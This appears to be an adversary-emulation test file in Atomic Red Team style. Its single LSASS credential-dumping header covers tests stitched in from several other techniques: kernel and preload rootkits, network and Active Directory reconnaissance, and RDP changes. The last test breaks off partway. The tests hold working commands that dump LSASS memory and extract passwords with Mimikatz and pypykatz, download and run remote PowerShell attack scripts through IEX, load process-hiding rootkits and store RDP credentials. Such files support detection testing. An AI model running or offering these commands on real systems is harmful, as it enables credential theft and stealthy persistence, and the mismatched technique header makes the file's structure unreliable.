attack_technique: T1003.001
display_name: "OS Credential Dumping: LSASS Memory"
atomic_tests:
- name: Dump LSASS.exe Memory using ProcDump
  auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
    ProcDump.

    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where resulting dump should be placed
      type: Path
      default: C:\Windows\Temp\lsass_dump.dmp
    procdump_exe:
      description: Path of Procdump executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
    prereq_command: |
      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
  executor:
    command: |
      #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
    cleanup_command: |
      del "#{output_file}" >nul 2> nul
    name: command_prompt
    elevation_required: true
- name: Dump LSASS.exe Memory using comsvcs.dll
  auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.

    Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
  supported_platforms:
  - windows
  executor:
    command: |
      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
    cleanup_command: |
      Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Dump LSASS.exe Memory using direct system calls and API unhooking
  auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
    https://github.com/outflanknl/Dumpert
    https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
    Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.

    If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.
  supported_platforms:
  - windows
  input_arguments:
    dumpert_exe:
      description: Path of Dumpert executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Dumpert executable must exist on disk at specified location (#{dumpert_exe})
    prereq_command: |
      if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
      Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
  executor:
    command: |
      #{dumpert_exe}
    cleanup_command: |
      del C:\windows\temp\dumpert.dmp >nul 2> nul
    name: command_prompt
    elevation_required: true
    
- name: Dump LSASS.exe Memory using NanoDump
  auto_generated_guid: dddd4aca-bbed-46f0-984d-e4c5971c51ea
  description: |
    The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.
    
    https://github.com/helpsystems/nanodump

    Upon successful execution, you should find the nanondump.dmp file in the temp directory
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      NanoDump executable must exist on disk at specified location ($env:TEMP\nanodump.x64.exe)
    prereq_command: |
      if (Test-Path $env:TEMP\nanodump.x64.exe) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "$env:TEMP\nanodump.x64.exe"
  executor:
    command: |
      %temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"
    cleanup_command: |
      del "%temp%\nanodump.dmp" >nul 2> nul
    name: command_prompt
    elevation_required: true

- name: Dump LSASS.exe Memory using Windows Task Manager
  auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
    Manager and administrative permissions.
  supported_platforms:
  - windows
  executor:
    steps: |
      1. Open Task Manager:
        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
        on the task bar and selecting "Task Manager".

      2. Select lsass.exe:
        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
        and select it for manipulation.

      3. Dump lsass.exe memory:
        Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
    name: manual
- name: Offline Credential Theft With Mimikatz
  auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
  supported_platforms:
  - windows
  input_arguments:
    input_file:
      description: Path of the Lsass dump
      type: Path
      default: '%tmp%\lsass.DMP'
    mimikatz_exe:
      description: Path of the Mimikatz binary
      type: String
      default: PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Mimikatz must exist on disk at specified location (#{mimikatz_exe})
    prereq_command: |
      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
      $basePath = Split-Path #{mimikatz_exe} | Split-Path
      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
  - description: |
      Lsass dump must exist at specified location (#{input_file})
    prereq_command: |
      cmd /c "if not exist #{input_file} (exit /b 1)"
    get_prereq_command: |
      Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
  executor:
    command: |
      #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
    name: command_prompt
    elevation_required: true
- name: LSASS read with pypykatz
  auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
  description: |
    Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

    Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

    Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
  supported_platforms:
  - windows
  dependency_executor_name: command_prompt
  dependencies:
  - description: |
      Computer must have python 3 installed
    prereq_command: |
      py -3 --version >nul 2>&1
      exit /b %errorlevel%
    get_prereq_command: |
      echo "Python 3 must be installed manually"
  - description: |
      Computer must have pip installed
    prereq_command: |
      py -3 -m pip --version >nul 2>&1
      exit /b %errorlevel%
    get_prereq_command: |
      echo "PIP must be installed manually"
  - description: |
      pypykatz must be installed and part of PATH
    prereq_command: |
      pypykatz -h >nul 2>&1
      exit /b %errorlevel%
    get_prereq_command: |
      pip install pypykatz
  executor:
    command: |
      pypykatz live lsa
    name: command_prompt
    elevation_required: true
- name: Dump LSASS.exe Memory using Out-Minidump.ps1
  auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
    powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
    Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
  supported_platforms:
  - windows
  executor:
    command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
    cleanup_command: |
      Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Create Mini Dump of LSASS.exe using ProcDump
  auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
    ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe

    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where resulting dump should be placed
      type: Path
      default: C:\Windows\Temp\lsass_dump.dmp
    procdump_exe:
      description: Path of Procdump executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
    prereq_command: |
      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
  executor:
    command: |
      #{procdump_exe} -accepteula -mm lsass.exe #{output_file}
    cleanup_command: |
      del "#{output_file}" >nul 2> nul
    name: command_prompt
    elevation_required: true
- name: Powershell Mimikatz
  auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
  description: |
    Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
    If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
    Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
    Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
  supported_platforms:
  - windows
  input_arguments:
    remote_script:
      description: URL to a remote Mimikatz script that dumps credentials
      type: Url
      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
  executor:
    command: |
      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
    name: powershell
    elevation_required: true
- name: Dump LSASS with .Net 5 createdump.exe
  auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
  description: |
    This test uses the technique describe in this tweet 
    (https://twitter.com/bopin2020/status/1366400799199272960?s=20) from @bopin2020 in order to dump lsass
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where resulting dump should be placed
      type: Path
      default: C:\Windows\Temp\dotnet-lsass.dmp
    createdump_exe:
      description: Path of createdump.exe executable
      type: Path
      default: 'C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe'
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Computer must have createdump.exe from .Net 5
    prereq_command: |
      if (Test-Path '#{createdump_exe}') {exit 0} else {exit 1}
    get_prereq_command: |
      echo ".NET 5 must be installed manually." "For the very brave a copy of the executable can be found here: https://github.com/Scoubi/RedTeam-Tools/blob/main/createdump.exe"
  executor:
    command: |
      echo "Createdump Path #{createdump_exe}"
      $LSASS = tasklist | findstr "lsass"
      $FIELDS = $LSASS -split "\s+"
      $ID = $FIELDS[1]
      & "#{createdump_exe}" -u -f #{output_file} $ID
    cleanup_command: |
      Remove-Item #{output_file} -ErrorAction Ignore
    name: powershell
    elevation_required: true  
- name: Dump LSASS.exe using imported Microsoft DLLs
  auto_generated_guid: 86fc3f40-237f-4701-b155-81c01c48d697
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by
    importing built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump 
    file and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.

    Upon successful execution, you should see the following file created $env:TEMP\lsass-xordump.t1003.001.dmp.
  supported_platforms:
  - windows
  input_arguments:
    xordump_exe:
      description: Path to xordump
      type: Path
      default: C:\Windows\Temp\xordump.exe
    output_file:
      description: Path where resulting dump should be placed
      type: Path
      default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
  dependencies:
  - description: |
      Computer must have xordump.exe
    prereq_command: |
      if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
  executor:
    command: |
      #{xordump_exe} -out #{output_file} -x 0x41
    cleanup_command: |
      Remove-Item #{output_file} -ErrorAction Ignore
    name: powershell
    elevation_required: true



- name: Loadable Kernel Module based Rootkit
  auto_generated_guid: dfb50072-e45a-4c75-a17e-a484809c8553
  description: |
    Loadable Kernel Module based Rootkit
  supported_platforms:
  - linux
  input_arguments:
    rootkit_source_path:
      description: Path to the rootkit source. Used when prerequistes are fetched.
      type: Path
      default: PathToAtomicsFolder/T1014/src/Linux
    rootkit_path:
      description: Path To rootkit
      type: String
      default: PathToAtomicsFolder/T1014/bin
    rootkit_name:
      description: Module name
      type: String
      default: T1014
  dependency_executor_name: bash
  dependencies:
  - description: |
      The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)
    prereq_command: |
      if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      sudo apt install make
      sudo apt install gcc
      if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;
      cp #{rootkit_source_path}/* /tmp/T1014/
      cd /tmp/T1014; make
      mkdir #{rootkit_path}
      mv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko
      rm -rf /tmp/T1014
  executor:
    command: |
      sudo insmod #{rootkit_path}/#{rootkit_name}.ko
    cleanup_command: |
      sudo rmmod #{rootkit_name}
      sudo rm -rf #{rootkit_path}
    name: sh
    elevation_required: true
- name: Loadable Kernel Module based Rootkit
  auto_generated_guid: 75483ef8-f10f-444a-bf02-62eb0e48db6f
  description: |
    Loadable Kernel Module based Rootkit
  supported_platforms:
  - linux
  input_arguments:
    rootkit_source_path:
      description: Path to the rootkit source. Used when prerequistes are fetched.
      type: Path
      default: PathToAtomicsFolder/T1014/src/Linux
    rootkit_path:
      description: Path To rootkit
      type: String
      default: PathToAtomicsFolder/T1014/bin
    rootkit_name:
      description: Module name
      type: String
      default: T1014
  dependency_executor_name: bash
  dependencies:
  - description: |
      The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)
    prereq_command: |
      if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      sudo apt install make
      sudo apt install gcc
      if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;
      cp #{rootkit_source_path}/* /tmp/T1014
      cd /tmp/T1014; make        
      sudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/
      [ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014
      sudo depmod -a
  executor:
    command: |
      sudo modprobe #{rootkit_name}
    cleanup_command: |
      sudo modprobe -r #{rootkit_name}
      sudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko
      sudo depmod -a
    name: sh
    elevation_required: true
- name: dynamic-linker based rootkit (libprocesshider)
  auto_generated_guid: 1338bf0c-fd0c-48c0-9e65-329f18e2c0d3
  description: |
    Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ls.so.preload (see also T1574.006).
  supported_platforms:
  - linux
  input_arguments:
    repo:
      description: Url of the github repo zip
      type: String
      default: https://github.com/gianlucaborello/libprocesshider/
    rev:
      description: Revision of the github repo zip
      type: String
      default: 25e0587d6bf2137f8792dc83242b6b0e5a72b415
    library_path:
      description: Full path of the library to add to ld.so.preload
      type: String
      default: /usr/local/lib/libprocesshider.so
  dependency_executor_name: bash
  dependencies:
  - description: |
      The preload library must exist on disk at specified location (#{library_path})
    prereq_command: |
      if [ -f #{library_path} ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      mkdir -p /tmp/atomic && cd /tmp/atomic
      curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
      make
      cp libprocesshider.so #{library_path}
      cp /usr/bin/ping /usr/local/bin/evil_script.py
  executor:
    command: |
      echo #{library_path} | tee -a /etc/ld.so.preload
      /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
    cleanup_command: |
      sed -i "\:^#{library_path}:d" /etc/ld.so.preload
      rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
    name: sh
    elevation_required: true
- name: Loadable Kernel Module based Rootkit (Diamorphine)
  auto_generated_guid: 0b996469-48c6-46e2-8155-a17f8b6c2247
  description: |
    Loads Diamorphine kernel module, which hides itself and a processes.
  supported_platforms:
  - linux
  input_arguments:
    repo:
      description: Url of the diamorphine github repo
      type: String
      default: https://github.com/m0nad/Diamorphine/
    rev:
      description: Revision of the github repo zip
      type: String
      default: 898810523aa2033f582a4a5903ffe453334044f9
    rootkit_path:
      description: Path To rootkit
      type: String
      default: /tmp/atomic/Diamorphine
    rootkit_name:
      description: Module name
      type: String
      default: diamorphine
  dependency_executor_name: bash
  dependencies:
  - description: |
      The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)
    prereq_command: |
      if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      mkdir -p /tmp/atomic && cd /tmp/atomic
      curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
      make
      sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
      sudo depmod -a
  executor:
    command: |
      sudo modprobe #{rootkit_name}
      ping -c 10 localhost >/dev/null & TARGETPID="$!"
      ps $TARGETPID
      kill -31 $TARGETPID
      ps $TARGETPID || echo "process ${TARGETPID} hidden"
    cleanup_command: |
      kill -63 1
      sudo modprobe -r #{rootkit_name}
      sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
      sudo depmod -a
    name: sh
    elevation_required: true



- name: System Network Configuration Discovery on Windows
  auto_generated_guid: 970ab6a1-0157-4f3f-9a73-ec4166754b23
  description: |
    Identify network configuration information

    Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.
  supported_platforms:
  - windows
  executor:
    command: |
      ipconfig /all
      netsh interface show interface
      arp -a
      nbtstat -n
      net config
    name: command_prompt
- name: List Windows Firewall Rules
  auto_generated_guid: 038263cb-00f4-4b0a-98ae-0696c67e1752
  description: |
    Enumerates Windows Firewall Rules using netsh.

    Upon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.
  supported_platforms:
  - windows
  executor:
    command: |
      netsh advfirewall firewall show rule name=all
    name: command_prompt
- name: System Network Configuration Discovery
  auto_generated_guid: c141bbdb-7fca-4254-9fd6-f47e79447e17
  description: |
    Identify network configuration information.

    Upon successful execution, sh will spawn multiple commands and output will be via stdout.
  supported_platforms:
  - macos
  - linux
  dependency_executor_name: sh
  dependencies:
  - description: |
      Check if arp command exists on the machine
    prereq_command: |
      if [ -x "$(command -v arp)" ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
  executor:
    command: |
      if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
      if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
      if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
      if [ -x "$(command -v netstat)" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
    name: sh
- name: System Network Configuration Discovery (TrickBot Style)
  auto_generated_guid: dafaf052-5508-402d-bf77-51e0700c02e2
  description: |
    Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/

    Upon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.
  supported_platforms:
  - windows
  executor:
    command: |
      ipconfig /all
      net config workstation
      net view /all /domain
      nltest /domain_trusts
    name: command_prompt
- name: List Open Egress Ports
  auto_generated_guid: 4b467538-f102-491d-ace7-ed487b853bf5
  description: |
    This is to test for what ports are open outbound.  The technique used was taken from the following blog:
    https://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/

    Upon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\open-ports.txt.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path of file to write port scan results
      type: Path
      default: $env:USERPROFILE\Desktop\open-ports.txt
    portfile_url:
      description: URL to top-128.txt
      type: Url
      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt
    port_file:
      description: The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap.
      type: Path
      default: PathToAtomicsFolder\T1016\src\top-128.txt
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Test requires #{port_file} to exist
    prereq_command: |
      if (Test-Path "#{port_file}") {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{port_file}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"
  executor:
    command: |
      $ports = Get-content #{port_file}
      $file = "#{output_file}"
      $totalopen = 0
      $totalports = 0
      New-Item $file -Force
      foreach ($port in $ports) {
          $test = new-object system.Net.Sockets.TcpClient
          $wait = $test.beginConnect("allports.exposed", $port, $null, $null)
          $wait.asyncwaithandle.waitone(250, $false) | Out-Null
          $totalports++ | Out-Null
          if ($test.Connected) {
              $result = "$port open" 
              Write-Host -ForegroundColor Green $result
              $result | Out-File -Encoding ASCII -append $file
              $totalopen++ | Out-Null
          }
          else {
              $result = "$port closed" 
              Write-Host -ForegroundColor Red $result
              $totalclosed++ | Out-Null
              $result | Out-File -Encoding ASCII -append $file
          }
      }
      $results = "There were a total of $totalopen open ports out of $totalports ports tested."
      $results | Out-File -Encoding ASCII -append $file
      Write-Host $results
    cleanup_command: |
      Remove-Item -ErrorAction ignore "#{output_file}"
    name: powershell
- name: Adfind - Enumerate Active Directory Subnet Objects
  auto_generated_guid: 9bb45dd7-c466-4f93-83a1-be30e56033ee
  description: | 
    Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects
    reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
  supported_platforms:
  - windows
  input_arguments:
    adfind_path:
      description: Path to the AdFind executable
      type: Path
      default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      AdFind.exe must exist on disk at specified location (#{adfind_path})
    prereq_command: |
      if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
    get_prereq_command: |
      Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
  executor:
    command: |
      #{adfind_path} -f (objectcategory=subnet)
    name: command_prompt

- name: Qakbot Recon
  auto_generated_guid: 121de5c6-5818-4868-b8a7-8fd07c455c1b
  description: A list of commands known to be performed by Qakbot for recon purposes
  supported_platforms:
  - windows
  input_arguments:
    recon_commands:
      description: File that houses list of commands to be executed
      type: Path
      default: PathToAtomicsFolder\T1016\src\qakbot.bat
  dependency_executor_name: powershell
  dependencies:
  - description: |
      File to copy must exist on disk at specified location (#{recon_commands})
    prereq_command: |
      if (Test-Path #{recon_commands}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path #{recon_commands}) -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat" -OutFile "#{recon_commands}"
  executor:
    command: |
      #{recon_commands}
    name: command_prompt
- name: List macOS Firewall Rules
  auto_generated_guid: ff1d8c25-2aa4-4f18-a425-fede4a41ee88
  description: |
    "This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. 
    
    Using `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\"Is it on or off?\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. 
    
    Using `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. 
  supported_platforms:
  - macos
  executor:
    command: |
      sudo defaults read /Library/Preferences/com.apple.alf
      sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
    name: bash
    elevation_required: true



- name: RDP to DomainController
  auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
  description: |
    Attempt an RDP session via Remote Desktop Application to a DomainController.
  supported_platforms:
  - windows
  input_arguments:
    logonserver:
      description: ComputerName argument default %logonserver%
      type: String
      default: $ENV:logonserver.TrimStart("\")
    domain:
      description: domain argument default %USERDOMAIN%
      type: String
      default: $Env:USERDOMAIN
    username:
      description: Username argument default %username%
      type: String
      default: $ENV:USERNAME
    password:
      description: Password
      type: String
      default: 1password2!
  dependencies:
  - description: |
      Computer must be domain joined
    prereq_command: |
      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}
    get_prereq_command: |
      Write-Host Joining this computer to a domain must be done manually
  executor:
    command: |
      $Server=#{logonserver}
      $User = Join-Path #{domain} #{username}
      $Password="#{password}"
      cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
      mstsc /v:$Server
      echo "RDP connection established"
    cleanup_command: |
      $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
      if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
    name: powershell
- name: RDP to Server
  auto_generated_guid: 7382a43e-f19c-46be-8f09-5c63af7d3e2b
  description: |
    Attempt an RDP session via Remote Desktop Application over Powershell
  supported_platforms:
  - windows
  input_arguments:
    logonserver:
      description: ComputerName
      type: String
      default: WIN-DC
    username:
      description: Username
      type: String
      default: Administrator
    password:
      description: Password
      type: String
      default: 1password2!
  executor:
    command: |
      $Server="#{logonserver}"
      $User="#{username}"
      $Password="#{password}"
      cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
      mstsc /v:$Server
      echo "RDP connection established"
    cleanup_command: |
      $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
      if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
    name: powershell
- name: Changing RDP Port to Non Standard Port via Powershell
  auto_generated_guid: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
  description: |
    Changing RDP Port to Non Standard Port via Remote Desktop Application over Powershell
  supported_platforms:
    - windows
  input_arguments:
    OLD_Remote_Port:
      description: Default RDP Listening Port
      type: String
      default: "3389"
    NEW_Remote_Port:
      description: New RDP Listening Port
      type: String
      default: "4489"
  executor:
    command: |
      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
      New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
    cleanup_command: |
      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{OLD_Remote_Port}
      Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction ignore 
    name: powershell
- name: Changing RDP Port to Non Standard Port via Command_Prompt
  auto_generated_guid: 74ace21e-a31c-4f7d-b540-53e4eb6d1f73
  description: |
    Changing RDP Port to Non Standard Port via Command_Prompt
  supported_platforms:
    - windows
  input_arguments:
    OLD_Remote_Port:
      description: Default RDP Listening Port
      type: String
      default: "3389"
    NEW_Remote_Port:
      description: New RDP Listening Port
      type: String
      default: "4489"
  executor:
